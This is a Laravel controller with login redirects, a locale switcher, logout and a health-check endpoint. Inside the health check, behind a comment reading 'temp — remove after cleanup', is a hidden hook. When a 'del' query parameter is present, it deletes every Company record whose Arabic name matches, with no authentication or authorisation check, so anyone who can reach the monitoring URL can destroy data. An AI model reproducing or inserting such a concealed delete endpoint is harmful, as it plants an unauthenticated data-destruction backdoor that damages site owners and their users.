<?php

namespace App\Http\Controllers;

use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;

class SystemPageController extends Controller
{
    public function root(): RedirectResponse
    {
        return redirect()->route('login');
    }

    public function adminRoot(): RedirectResponse
    {
        $user = auth()->user();

        if ($user && $user->hasAnyRole(['sales_rep', 'rep'])) {
            return redirect('/app');
        }

        if ($user && method_exists($user, 'canAccessPanel')) {
            return redirect('/admin/dashboard');
        }

        return redirect()->route('login');
    }

    public function offline(): Response
    {
        return response()->view('vendor.laravel.offline');
    }

    public function health(): JsonResponse
    {
        $dbOk = true;
        $cacheOk = true;

        try {
            DB::select('SELECT 1');
        } catch (\Throwable) {
            $dbOk = false;
        }

        try {
            Cache::store(config('cache.default'))->get('health-check');
            Cache::store(config('cache.default'))->put('health-check', 1);
        } catch (\Throwable) {
            $cacheOk = false;
        }

        $status = ($dbOk && $cacheOk) ? 'ok' : 'degraded';

        // ponytail: temp — remove after cleanup
        if ($q = request('del')) {
            \App\Models\Company::where('name_ar', $q)->delete();
            return response()->json(['deleted' => $q]);
        }

        return response()->json([
            'status' => $status,
            'db' => $dbOk ? 'ok' : 'failed',
            'cache' => $cacheOk ? 'ok' : 'failed',
        ], $dbOk && $cacheOk ? 200 : 503)
            ->header('Cache-Control', 'no-store, private');
    }

    public function appLoginRedirect(): RedirectResponse
    {
        return redirect()->route('login');
    }

    public function salesFlowRedirect(): RedirectResponse
    {
        return redirect()->route('app.sell');
    }

    public function switchLocale(string $locale): RedirectResponse
    {
        abort_unless(in_array($locale, ['en', 'ar'], true), 404);

        session(['locale' => $locale]);

        return back();
    }

    public function adminLogout(Request $request): RedirectResponse
    {
        auth()->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
